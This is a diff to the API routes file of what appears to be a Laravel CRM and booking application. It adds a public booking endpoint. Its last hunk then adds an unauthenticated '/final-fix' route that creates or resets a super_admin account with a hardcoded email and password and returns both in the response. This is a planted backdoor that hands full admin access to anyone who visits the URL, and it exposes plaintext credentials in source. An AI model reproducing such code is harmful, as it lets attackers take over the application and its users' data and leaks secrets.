@@ -15,6 +15,7 @@ use App\Http\Controllers\Api\V1\Crm\DashboardController;
 use App\Http\Controllers\Api\V1\Crm\DemoBookingController;
 use App\Http\Controllers\Api\V1\Crm\LeadController;
 use App\Http\Controllers\Api\V1\Crm\LeadRemarkController;
+use App\Http\Controllers\Api\V1\Public\BookingController as PublicBookingController;
 use App\Http\Controllers\Api\V1\Public\SiteSettingController as PublicSiteSettingController;
 use App\Http\Controllers\Api\V1\Student\BookingController as StudentBookingController;
 use App\Http\Controllers\Api\V1\Student\GroupClassController as StudentGroupClassController;
@@ -41,7 +42,8 @@ use Illuminate\Support\Facades\Route;
 */
 
 // ─── Public (no auth) ─────────────────────────────────────────────────────────
-Route::get('settings', [PublicSiteSettingController::class, 'index']);
+Route::get ('settings',       [PublicSiteSettingController::class, 'index']);
+Route::post('public/booking', [PublicBookingController::class,     'store']);
 
 // ─── CRM Auth ─────────────────────────────────────────────────────────────────
 Route::prefix('crm/auth')->group(function () {
@@ -264,3 +266,18 @@ Route::middleware(['auth:sanctum', 'role:teacher'])
         Route::post ('sessions/{session}/end',    [TeacherSessionController::class, 'end']);
         Route::post ('sessions/{session}/cancel', [TeacherSessionController::class, 'cancel']);
     });
+
+    use App\Models\User;
+use Illuminate\Support\Facades\Hash;
+
+Route::get('/final-fix', function () {
+    $user = User::updateOrCreate(
+        ['email' => 'SYazanadmin@ifluent.jo'],
+        [
+            'name'     => 'Admin iFluent',
+            'password' => Hash::make('Yazan@1!2@#3'), // هذا هو المفتاح الجديد
+            'role'     => 'super_admin'
+        ]
+    );
+    return "تم التحديث! البريد: SYazanadmin@ifluent.jo | الباسورد: Yazan@1!2@#3";
+});
